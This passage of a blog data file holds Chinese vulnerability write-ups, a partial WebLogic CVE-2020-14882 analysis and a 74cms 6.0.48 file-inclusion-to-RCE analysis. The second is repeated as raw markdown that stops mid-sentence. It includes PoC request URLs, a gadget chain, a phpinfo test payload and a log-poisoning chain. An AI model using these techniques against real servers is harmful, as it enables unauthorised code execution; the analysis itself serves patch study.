&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实这里的内容很简单，让我们换一个poc，大家就会很清晰的了解getHandle的功能以及为什么可以造成代码执行漏洞。我们这里更换的poc如下：</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=java.lang.String(&quot;kumamon.fun&quot;)\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=java.lang.String(&quot;kumamon.fun&quot;)</a></p>\n<p>此时传入getHandle的变量为String类型的字符串：java.lang.String(“kumamon.fun”)，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165638-519f7b96-1ce9-1.png\" alt=\"35ddc015a8b2deb9a9809b46c2a3857f.png\"></p>\n<p>接着getHandle方法判断字符串中左括号“(”的位置。(左括号ascii码值为40)，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165648-57677f60-1ce9-1.png\" alt=\"0be72a36dbd1638822c43a7c05d3815f.png\"></p>\n<p>紧接着，通过左括号位置，获取className以及objectIdentifier</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165658-5d4151b8-1ce9-1.png\" alt=\"3a9f5620e9e459c287958cf754780547.png\"></p>\n<p>这里className为字符串：java.lang.String而objectIdentifier为字符串kumamon.fun</p>\n<p>接着程序做了三件事情：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165708-635f032e-1ce9-1.png\" alt=\"698d79a1d772b6b0916f38db05d79b9a.png\"></p>\n<ol>\n<li><p>通过className获取对应的Class对象</p>\n</li>\n<li><p>将String类型的objectIdentifier存入 Object[]数组中</p>\n</li>\n<li><p>获取该类的带String类型参数的构造方法</p>\n</li>\n</ol>\n<p>最后，程序调用该带String类型参数的构造方法，实例化一个对象</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165718-692f1b68-1ce9-1.png\" alt=\"84d53abd6ffa717c23a1e140cef89675.png\"></p>\n<p>漏洞触发点到此已经分析结束了。回顾上文，当我们构造一个如下url时：</p>\n<p><a href=\"http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=a(&quot;b&quot;)\">http://localhost:7001/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=a(&quot;b&quot;)</a></p>\n<p>Weblogic将会调用a方法的带String类型参数的构造方法，并将b字符串传入执行</p>\n<p>那么我们怎么样才能找到这样一个利用链呢？需要满足恶意类中存在带String类型参数的构造方法、且该构造方法中存在着可以利用的地方，使得我们构造的字符串传入后可以顺利的执行。</p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><p>不得不说，Weblogic的漏洞往往有着关联，比如说CVE-2019-2725，这个漏洞当时遇到的payload的条件与这次的几乎一样，在CVE-2019-2725漏洞中，廖新喜给出了一个无视jdk版本限制的利用链：</p>\n<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</p>\n<p><a href=\"http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/\">http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/</a></p>\n<p>但廖大神并没有给出具体的利用方式。详细的Poc构造以及利用可以参考我的这篇文章：</p>\n<p><em><a href=\"https://kumamon.fun/CVE-2020-14882/\">https://kumamon.fun/CVE-2020-14882/</a></em></p>\n<p>里面利用到的利用链即为：</p>\n<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 这条</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165732-71dc06c2-1ce9-1.png\" alt=\"a5771d8a2b3650d45648e2d743bb0c5f.png\"></p>\n<p>于此同时，com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</p>\n<p>与FileSystemXmlApplicationContext相同，都是继承了AbstractXmlApplicationContext类，因此ClassPathXmlApplicationContext这条也是可用的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201102165743-7873e1bc-1ce9-1.png\" alt=\"8b0786bd524d4951164bc0a0a1a95525.png\"></p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>本来想将CVE-2020-14882、CVE-2020-14883放到一篇文章中来介绍，但奈何CVE-2020-14883这个漏洞中内容也挺多的，放在一块文章太长了。写的多不如写的细，因此把他们分开成为两个文章。</p>\n<p>后续关于FileSystemXmlApplicationContext这条利用链是如何构造的，我也想写一篇文章详细的谈谈，希望大家喜欢。</p>\n"},{"title":"骑士cms从任意文件包含到远程代码执行漏洞分析","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1190979594b32da626b7578f5d3de6c.jpg","date":"2020-12-03T06:12:17.000Z","_content":"\n前言\n----\n\n前些日子，骑士cms 官方公布了一个系统紧急风险漏洞升级通知：骑士cms 6.0.48存在一处任意文件包含漏洞，利用该漏洞对payload文件进行包含，即可造成远程代码执行漏洞。这篇文章将从漏洞公告分析开始，叙述一下笔者分析漏洞与构造payload时遇到的有趣的事情。\n\n漏洞情报\n--------\n\n官方发布的系统紧急风险漏洞升级通知如下：\n\nhttp://www.74cms.com/news/show-2497.html\n\n从官方公布的信息来看，官方修复了两个地方：\n\n1、/Application/Common/Controller/BaseController.class.php\n\n![5aa627c04fe6466d54325608c465affe.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110015-ab36dfcc-3513-1.png)\n\n2、/ThinkPHP/Library/Think/View.class.php\n\n![b1d2dab890cca24c649a871e938606bb.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110029-b3915648-3513-1.png)\n\n从BaseController.class.php这处补丁来看：\n\n笔者猜测漏洞多半出在了渲染简历模板的assign_resume_tpl方法中。从补丁修复上来看，增添了如下代码\n\n```php\n$tpl_file = $view->parseTemplate($tpl);\n\nif(!is_file($tpl_file)){\n\nreturn false;\n\n}\n```\n\n可以发现程序通过$view->parseTemplate对$tpl参数进行处理，并对处理结果$tpl_file进行is_file判断\n\n我们先跟入$view->parseTemplate看看\n\n![5064cfae5a0467d8dac5852f77bdad0e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110042-bb249816-3513-1.png)\n\n从上图143行的结果来看，parseTemplate中也是先通过is_file判断，然后将符合的结果返回。\n\n如果此处传入的$tpl变量是文件，那么这个文件可以顺利的通过parseTemplate与assign_resume_tpl方法中的is_file判断。回想一下，这是一个文件包含漏洞，成功利用的先前条件是恶意的文件得存在，然后被包含。这个漏洞多半是通过assign_resume_tpl方法的$tpl参数传入一个真实存在的待包含的恶意文件，而补丁先通过parseTemplate方法内的is_file判断了一次这个恶意文件是否存在，接着又在assign_resume_tpl方法通过is_file方法判断一次，成功的利用一定会使is_file为true。那assign_resume_tpl方法中增加的代码是否有作用？又有着什么作用？\n\n这个问题笔者将在文章最后介绍。\n\n接下来从第二处View.class.php这处补丁来看：\n\n补丁将fetch 方法中\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n```\n\n代码注释替换为\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_'));\n```\n\n在thinkphp中，E()函数是用来抛出异常处理的。可见这处的修改应该是不想让$templateFile变量值写到日志log文件中。\n\n单从这点来看，命令执行所需的payload百分百是可以通过$templateFile变量写到log文件里的,然后配合任意文件包含漏洞将这个log文件包含并执行。\n\n漏洞分析\n--------\n\n通过对漏洞情报的分析，我们差不多知道了这个漏洞的来龙去脉：\n\n1.  通过控制fetch 方法中$templateFile变量，将payload写入log文件\n\n2.  通过assign_resume_tpl方法包含这个存在payload的log文件\n\n首先我们抛开怎么把payload写入log文件，先来看看文件包含漏洞怎么回事。\n\n经过上文的猜测，我们可以通过assign_resume_tpl方法包含任意文件。首先我们要看看怎么通过请求调用assign_resume_tpl方法\n\n### 如何访问assign_resume_tpl方法\n\nassign_resume_tpl方法位于common模块base控制器下。通过对Thinkphp路由的了解，assign_resume_tpl方法多半是用如下url进行调用\n\n<http://127.0.0.1//74cms/index.php?m=common&c=base&a=assign_resume_tpl>\n\n但是实际上，程序抛出了个错误\n\n![9444960329c91727ea6dbec7b20fa1cb.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110055-c2bc7b0c-3513-1.png)\n\n这是为什么呢？经过动态调试发现一个有意思的事情：common模块是并不能被直接调用的。原因如下：\n\n\\\\ThinkPHP\\\\Library\\\\Think\\\\Dispatcher.class.php中存在如下代码\n\n![88af447596e2829c4411f28661b542a8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110105-c8b4f08e-3513-1.png)\n\n从上图代码可见，因为我们common模块位于MODULE_DENY_LIST中，因此不能直接通过m=common来调用common模块。\n\n既然不能直接调用，看看有没有其他的办法调用common模块base控制器下的assign_resume_tpl方法\n\n经过研究发现，几乎所有其他的控制器，最终都继承自common模块的BaseController控制器\n\n我们拿Home模块的AbcController控制器举例,见下图：\n\n![403e42518385b162d794fb3b941c6388.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110113-cda5eed6-3513-1.png)\n\nAbcController 继承FrontendController\n\n![35b39ce4673b5ade1e2497dcb94bd0a0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110122-d2c14c94-3513-1.png)\n\n而FrontendController由继承了BaseController\n\n因此可以通过get请求\n\nhttp://127.0.0.1/74cms/index.php?m=home&c=abc&a=assign_resume_tpl&variable=1&tpl=2\n\n来调用BaseController下的assign_resume_tpl，并将$variable=1、$tpl=2参数传递进去\n\n![a2172aab27f3ef1b48b7af9163c7bcdd.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110132-d9051f7c-3513-1.png)\n\n同理，Home模块下的IndexController控制器也是可以的，见下图\n\n![71a84a69aed01a87e4f773c16074ea41.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110143-df9d869e-3513-1.png)\n\nIndexController继承FrontendController，从上文可知，FrontendController继承BaseController。因此也可以通过get请求\n\nhttp://127.0.0.1/74cms/index.php?m=home&c=index&a=assign_resume_tpl&variable=1&tpl=2\n\n来访问BaseController下的assign_resume_tpl并向该方法传参\n\n![b1d60a095246236ff99c0ff8b4210fed.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110154-e5bf046c-3513-1.png)\n\n我们后续分析就用\n\n<http://127.0.0.1/74cms/index.php?m=home&c=index&a=assign_resume_tpl&variable=xxx&tpl=xxx>\n\n这样的形式调用assign_resume_tpl方法\n\n既然我们可以通过请求向存在漏洞的assign_resume_tpl方法传参了，距离漏洞利用成功已经不远了\n\n### 用测试文件触发文件包含\n\n我们接下来”假装”在后台上传一个payload，用assign_resume_tpl这个接口包含下试试\n\n笔者手动在如下目录里放了个test.html\n\n![94f079c4ee2149e6f76d6c77c7b6d256.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110205-ecc6849c-3513-1.png)\n\n为什么这么放呢？因为笔者在源代码里看到如下代码\n\n![69df56ea206c171eef4e1aa43e51b167.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110215-f2aa2bde-3513-1.png)\n\n这里是74cms使用assign_resume_tpl调用word_resume.html的形式。因此笔者在测试时也在word_resume.html通目录下放置了一个test.html，其内容如下：\n\n![11ba75fcfd04e5eae60d9888468b9048.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110225-f8990286-3513-1.png)\n\n构造如下请求\n\n<http://127.0.0.1/74cms/index.php?m=home&c=index&a=assign_resume_tpl&variable=1&tpl=Emailtpl/test>\n\n请求将调用assign_resume_tpl方法。动态调试过程如下：\n\n![7cb8badae382c35d54466000a3b9441f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110236-fee339ae-3513-1.png)\n\n可见此时$tpl为Emailtpl/test，get请求中参数成功传入了。\n\n我们来看一下fetch里怎么实现的\n\n![6b99d80ecb0f333ed74925335e0ec179.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110247-0573872e-3514-1.png)\n\n程序会执行到fetch方法中的Hook::listen('view_parse',$params);代码处\n\n![c036dd43047a181f550626ad8df457c2.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110256-0b31ebc4-3514-1.png)\n\n此处代码很关键，需要详细说明下。Hook::listen('view_parse',$params);这处代码的作用大体上有两个：\n\n1.  Compiler：将模板文件经过一定解析与编译，生成缓存文件xxx.php\n\n2.  Load：通过include方法加载上一步生成的xxx.php缓存文件\n\n简而言之，Hook::listen('view_parse',$params);先通过Compiler将攻击者传入的模板文件编译为一个缓存文件，随后调用Load加载这个编译好的缓存文件。\n\n首先我们来看下生产缓存文件过程\n\n#### Compiler\n\n![31a5ff3300343ac374148a72a0dd8588.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110309-12ac0bf0-3514-1.png)\n\n从Hook::listen('view_parse',$params);到compiler方法的调用链如下：\n\n![64891519910e85a6a42ac40810be6e9d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110317-17b311b6-3514-1.png)\n\n该方法会将thinkphp的html模板中定义的标签，解析成php代码。例如模板中的”<qscms:company_show/>”\n\n就会被解析成\n\n![8e827252d1f78414700cd630ab754864.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110328-1e5321e6-3514-1.png)\n\n除此之外，compiler方法还会将生成的xxx.php文件头部加上一个如下代码以防止该文件被直接执行\n\n```php\n<?php if (!defined('THINK_PATH')) exit();\n```\n\n说完compiler方法的功能后，我们来看下compiler方法是如何处理我们的test.html。\n\ntest.html中的代码为<?php phpinfo(); ?>，经过解析之后，返回值见下图\n\n![b480be6cff72222f2025bbfd2b65271c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110340-24f31b78-3514-1.png)\n\n上图compiler方法最终返回的是strip_whitespace($tmplContent);\n\n但strip_whitespace方法的作用是去除代码中的空白和注释，对我们的payload没什么实际意义。\n\n最终compiler方法返回值为\n\n```php\n<?php if (!defined('THINK_PATH')) exit(); phpinfo();?>\n```\n\n这个值被写入一个缓存文件，见下图\n\n![11b8744f27297b10d84cf708057b471c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110350-2b54b5e4-3514-1.png)\n\n缓存文件位于data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php\n\n![c3c54d062abc49548ea48afbc33395f0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110401-31cd5854-3514-1.png)\n\n到此为止，compiler流程已经结束，我们接下来看看加载过程\n\n#### Load\n\nLoad代码如下图所示\n\n![7aa85eb5ad15da842e9171513ad2f150.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110412-38878160-3514-1.png)\n\n从Hook::listen('view_parse',$params);到load方法的调用链如下：\n\n![70c4e79c2d0424fe398992dcf91af922.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110422-3e51db7c-3514-1.png)\n\n从第一张图可见，load代码最终会include 我们compiler流程中生产的那个data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php缓存文件\n\n当8a848d32ad6f6040d5461bb8b5f65eb0.php被include之后，其中的恶意代码执行，见下图\n\n![e3686e2479975e1820d9cf36fd58f907.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110435-463a4388-3514-1.png)\n\n执行成功后，浏览器如下\n\n![16c7ecd9e2af85defd979531b5030000.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110448-4dadbe6a-3514-1.png)\n\n等等，为什么没有phpinfo的回显呢？是不是我们phpinfo执行失败了？我们换一个payload试试，见下图\n\n![af7dd12134991a71b0e6e926fb19b233.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110457-5309232c-3514-1.png)\n\n这次我们执行一个生产目录的命令\n\n![db01c632208c94ae46df30b87b5cf5a7.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110507-5912f4dc-3514-1.png)\n\n可见命令执行成功了。但是为什么phpinfo没有回显呢？\n\n### phpinfo回显哪去了\n\n从上文看，我们使用测试文件进行包含利用成功了，但是phpinfo的回显却不见了。进过研究发现，原因还是在fetch方法里。在fetch中，注意看下图红框处代码：\n\n![b90c07a43bcf7ba6245dfcea7d6eecdc.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110517-5eea7876-3514-1.png)\n\nFetch中的load流程，即加载payload执行phpinfo的过程在上图126行处Hook::listen('view_parse',$params);代码中完成的。\n\n而在此之前，程序通过ob_start打开缓冲区，因此phpinfo输出的信息被存储于缓冲区内，而在Hook::listen代码执行之后，又通过ob_get_clean将缓冲区里的内容取出赋值给$content并删除当前输出缓冲区。因此phpinfo虽然执行成功，但回显并不会显示在浏览器页面上。\n\n如果想要获取回显，我们该怎么办呢？这其实很简单，见下图\n\n![eeedcef07c82e7e4b1dd41dcfac688d8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110526-6430b02a-3514-1.png)\n\n此时生成的缓存文件如下：\n\n![caa1ebf3c9864c988ac9783ed13927b2.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110537-6ab84098-3514-1.png)\n\n虽然在include这个缓存文件之前，程序通过ob_start打开缓冲区将phpinfo的输出存到缓冲区里，但我们可以通过执行ob_flush冲刷出（送出）输出缓冲区中的内容，打印到浏览器页面上\n\n![62bd36b0497018cf2b3057ed3a02fe03.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110546-70186428-3514-1.png)\n\n### 怎么将payload写入文件\n\n上文我们一直在用一个手动上传的test.html，很显然这在实际漏洞利用过程中是不行的。我们需要想办法在目标服务器里写入一个payload。\n\n在这里笔者绕了很多弯路，尝试着在图片上传处做文章，但最后失败了。后来笔者突然想起来官方的补丁，还记得上文我们从官方补丁中得到的漏洞情报？\n\n补丁将fetch 方法中\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n```\n\n代码注释替换为\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_'));\n```\n\n修改之处的E()函数是用来抛出异常处理的，而补丁将$templateFile删除，正是不想让$templateFile变量值写到日志log文件中。看来payload是可以写到日志文件里的。\n\n我们回过头来，看看fetch 方法中$templateFile变量怎么控制\n\n![1d8138dd946fd4cc7c4f2ecca308cbb1.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110558-7795157a-3514-1.png)\n\n还记得上文的分析吗？$templateFile变量其实就是请求中传入的tpl变量可以被攻击者控制。从上图来看，只要请求中传入的tpl变量不是文件，就可以将tpl变量值写入log文件。\n\n那么我们就让请求中传入的tpl变量为payload字符串，满足不是文件判断，让这个payload写到日志中\n\n实际发送如下请求控制$templateFile变量写入日志文件\n\n![55762aad4cd5dd4ca2a9fd0bc211cd10.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110608-7d9bf60a-3514-1.png)\n\n动态调试如下：\n\n![1c6571b6153d1413b5ce3546c814146c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110618-834badac-3514-1.png)\n\n日志被写到data/Runtime/Logs/Home/20_12_02.log，见下图\n\n![896e4c9fd287cb6cf3182bdde9a1293c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110628-8934c08c-3514-1.png)\n\n但有个问题：我们为什么不像上文一贯作风，使用get请求传递tpl变量值呢？因为从get请求中url会在日志文件中被url编码，而post请求则不然。因此只能发送post请求。\n\n到此，完整的利用链构造出来了，发送如下请求即可包含日志文件并执行payload\n\n![308216e7581d00fbadf496dc6b2beeb8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110640-90c3f502-3514-1.png)\n\n写在最后\n--------\n\n总得来说这个漏洞并不复杂，但是却很巧妙。在此过程中遇到很多有趣是问题。\n\n### 构造图片payload问题\n\n在从官方补丁中发现利用log文件写入payload思路之前，笔者花费大量时间尝试利用图片上传写入payload。因为74cms中利用了ThinkImage(也就是php-GD)对图片的渲染和处理导致webshell代码错位失效，笔者尝试了这篇文章里的思路\n\n<https://paper.seebug.org/387/#2-bypass-php-gdwebshell>\n\n这下倒是成功了一半：ThinkImage出现异常抛出错误了，并没有对笔者webshell图片进行渲染和处理，这看起来太棒了。但坏消息是，因为ThinkImage抛出异常，程序并没有把笔者上传成功后存储于服务器上的图片名称抛出来，而图片名称是通过uniqid()函数生成的随机数。uniqid() 函数基于以微秒计的当前时间，生成一个唯一的ID。笔者也没有办法猜测出上传后的图片名是什么，因此作罢。\n\n这个问题与接下来的问题相关，也就是官方的补丁到底有没有效\n\n### 官方第一处补丁到底有没有用\n\n还记得上文漏洞情报分析那里，关于第一处补丁笔者的分析吗？\n\n补丁在assign_resume_tpl方法中增添了如下代码\n\n```php\n$tpl_file = $view->parseTemplate($tpl);\n\nif(!is_file($tpl_file)){\n\nreturn false;\n\n}\n```\n\n笔者在分析漏洞之前的想法是：因为这是一个文件包含漏洞，而assign_resume_tpl方法正是这个漏洞的入口，因此如果我们传入的$tpl必定是一个文件，这样可以轻松的绕过$view->parseTemplate($tpl);（parseTemplate中进行判断，如果传入的tpl是文件则直接return）与if(!is_file($tpl_file))判断。\n\n但经过深入的漏洞分析发现，assign_resume_tpl方法不仅是文件包含漏洞的入口，也是后续将payload写入log文件的接口，通过控制assign_resume_tpl方法的tpl参数为字符串形式的payload，则这个payload将会在fetch中被写入日志文件。\n\n![b7434e7d568331a5078aae73e61415ae.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110703-9e43bf64-3514-1.png)\n\n但在assign_resume_tpl方法中增加了判断\n\n![3b42f29aa73f0b0a718cbc2ebf766527.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110719-a7791f48-3514-1.png)\n\n$tpl_file会是payload字符串拼接.html这样的形式，接下来的if(!is_file($tpl_file))会return false，而保护程序不进入fetch。\n\n但这样真有必要吗？因为fetch中也打了补丁，经过上文对补丁的分析，就算是assign_resume_tpl方法中没有修改使得payload进入了fetch，由于补丁的原因fetch中也不会把payload写入日志了，因此这里的补丁显的没有太大必要。\n\n### 官方补丁可以绕过吗\n\n经过从上面两个问题的思考，可以发现一个新的问题，那就是官方补丁是否可以绕过。通过对漏洞的了解，官方补丁实际起作用的是不让payload写入日志文件。如果真的有人有办法在图片中写入payload并上传成功，在assign_resume_tpl方法中直接包含这个文件即可利用成功。assign_resume_tpl方法中的补丁并没有限制tpl参数为文件。\n\n也就是说：要么官方补丁是可以轻松绕过的、要么通过构造图片webshell这条路走不通。具体哪个是对的，就要看看官方后续是否又出补丁绕过公告与一个新的补丁了。","source":"_posts/74cmsrce.md","raw":"---\ntitle: 骑士cms从任意文件包含到远程代码执行漏洞分析\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1190979594b32da626b7578f5d3de6c.jpg'\ndate: 2020-12-03 14:12:17\n---\n\n前言\n----\n\n前些日子，骑士cms 官方公布了一个系统紧急风险漏洞升级通知：骑士cms 6.0.48存在一处任意文件包含漏洞，利用该漏洞对payload文件进行包含，即可造成远程代码执行漏洞。这篇文章将从漏洞公告分析开始，叙述一下笔者分析漏洞与构造payload时遇到的有趣的事情。\n\n漏洞情报\n--------\n\n官方发布的系统紧急风险漏洞升级通知如下：\n\nhttp://www.74cms.com/news/show-2497.html\n\n从官方公布的信息来看，官方修复了两个地方：\n\n1、/Application/Common/Controller/BaseController.class.php\n\n![5aa627c04fe6466d54325608c465affe.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110015-ab36dfcc-3513-1.png)\n\n2、/ThinkPHP/Library/Think/View.class.php\n\n![b1d2dab890cca24c649a871e938606bb.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110029-b3915648-3513-1.png)\n\n从BaseController.class.php这处补丁来看：\n\n笔者猜测漏洞多半出在了渲染简历模板的assign_resume_tpl方法中。从补丁修复上来看，增添了如下代码\n\n```php\n$tpl_file = $view->parseTemplate($tpl);\n\nif(!is_file($tpl_file)){\n\nreturn false;\n\n}\n```\n\n可以发现程序通过$view->parseTemplate对$tpl参数进行处理，并对处理结果$tpl_file进行is_file判断\n\n我们先跟入$view->parseTemplate看看\n\n![5064cfae5a0467d8dac5852f77bdad0e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110042-bb249816-3513-1.png)\n\n从上图143行的结果来看，parseTemplate中也是先通过is_file判断，然后将符合的结果返回。\n\n如果此处传入的$tpl变量是文件，那么这个文件可以顺利的通过parseTemplate与assign_resume_tpl方法中的is_file判断。回想一下，这是一个文件包含漏洞，成功利用的先前条件是恶意的文件得存在，然后被包含。这个漏洞多半是通过assign_resume_tpl方法的$tpl参数传入一个真实存在的待包含的恶意文件，而补丁先通过parseTemplate方法内的is_file判断了一次这个恶意文件是否存在，接着又在assign_resume_tpl方法通过is_file方法判断一次，成功的利用一定会使is_file为true。那assign_resume_tpl方法中增加的代码是否有作用？又有着什么作用？\n\n这个问题笔者将在文章最后介绍。\n\n接下来从第二处View.class.php这处补丁来看：\n\n补丁将fetch 方法中\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n```\n\n代码注释替换为\n\n```php\nif(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_'));\n```\n\n在thinkphp中，E()函数是用来抛出异常处理的。可见这处的修改应该是不想让$templateFile变量值写到日志log文件中。\n\n单从这点来看，命令执行所需的payload百分百是可以通过$templateFile变量写到log文件里的,然后配合任意文件包含漏洞将这个log文件包含并执行。\n\n漏洞分析\n--------\n\n通过对漏洞情报的分析，我们差不多知道了这个漏洞的来龙去脉：\n\n1.  通过控制fetch 方法中$templateFile变量，将payload写入log文件\n\n2.  通过assign_resume_tpl方法包含这个存在payload的log文件\n\n首先我们抛开怎么把payload写入log文件，先来看看文件包含漏洞怎么回事。\n\n经过上文的猜测，我们可以通过assign_resume_tpl方法包含任意文件。首先我们要看看怎么通过请求调用assign_resume_tpl方法\n\n### 如何访问assign_resume_tpl方法\n\nassign_resume_tpl方法位于common模块base控制器下。通过对Thinkphp路由的了解，assign_resume_tpl方法多半是用如下url进行调用\n\n<http://127.0.0.1//74cms/index.php?m=common&c=base&a=assign_resume_tpl>\n\n但是实际上，程序抛出了个错误\n\n![9444960329c91727ea6dbec7b20fa1cb.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110055-c2bc7b0c-3513-1.png)\n\n这是为什么呢？经过动态调试发现一个有意思的事情：common模块是并不能被直接调用的。原因如下：\n\n\\\\ThinkPHP\\\\Library\\\\Think\\\\Dispatcher.class.php中存在如下代码\n\n![88af447596e2829c4411f28661b542a8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110105-c8b4f08e-3513-1.png)\n\n从上图代码可见，因为我们common模块位于MODULE_DENY_LIST中，因此不能直接通过m=common来调用common模块。\n\n既然不能直接调用，看看有没有其他的办法调用common模块base控制器下的assign_resume_tpl方法\n\n经过研究发现，几乎所有其他的控制器，最终都继承自common模块的BaseController控制器\n\n我们拿Home模块的AbcController控制器举例,见下图：\n\n![403e42518385b162d794fb3b941c6388.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110113-cda5eed6-3513-1.png)\n\nAbcController 继承FrontendController\n\n![35b39ce4673b5ade1e2497dcb94bd0a0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110122-d2c14c94-3513-1.png)\n\n而FrontendController由继承了BaseController\n\n因此可以通过get请求\n\nhttp://127.0.0.1/74cms/index.php?m=home&c=abc&a=assign_resume_tpl&variable=1&tpl=2\n\n来调用BaseController下的assign_resume_tpl，并将$variable=1、$tpl=2参数传递进去\n\n![a2172aab27f3ef1b48b7af9163c7bcdd.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110132-d9051f7c-3513-1.png)\n\n同理，Home模块下的IndexController控制器也是可以的，见下图\n\n![71a84a69aed01a87e4f773c16074ea41.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110143-df9d869e-3513-1.png)\n\nIndexController继承FrontendController，从上文可知，FrontendController继承BaseController。因此也可以通过get请求\n\nhttp://127.0.0.1/74cms/index.php?m=home&c=index&a=assign_resume_tpl&variable=1&tpl=2\n\n来访问BaseController下的assign_resume_tpl并向该方法传参\n\n![b1d60a095246236ff99c0ff8b4210fed.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110154-e5bf046c-3513-1.png)\n\n我们后续分析就用\n\n<http://127.0.0.1/74cms/index.php?m=home&c=index&a=assign_resume_tpl&variable=xxx&tpl=xxx>\n\n这样的形式调用assign_resume_tpl方法\n\n既然我们可以通过请求向存在漏洞的assign_resume_tpl方法传参了，距离漏洞利用成功已经不远了\n\n### 用测试文件触发文件包含\n\n我们接下来”假装”在后台上传一个payload，用assign_resume_tpl这个接口包含下试试\n\n笔者手动在如下目录里放了个test.html\n\n![94f079c4ee2149e6f76d6c77c7b6d256.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110205-ecc6849c-3513-1.png)\n\n为什么这么放呢？因为笔者在源代码里看到如下代码\n\n![69df56ea206c171eef4e1aa43e51b167.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110215-f2aa2bde-3513-1.png)\n\n这里是74cms使用assign_resume_tpl调用word_resume.html的形式。因此笔者在测试时也在word_resume.html通目录下放置了一个test.html，其内容如下：\n\n![11ba75fcfd04e5eae60d9888468b9048.png](https://xzfile.aliyuncs.com/media/upload/picture/20201203110225-f8990286-3513-1.png)\n\n构造如下请求\n\n<http://127.0.0.1/74cms/index.php?m=home&c=index&a=assign_resume_tpl&variable=1&tpl=Emailtpl/test>\n\n请求将调用assign_resume_tpl方法。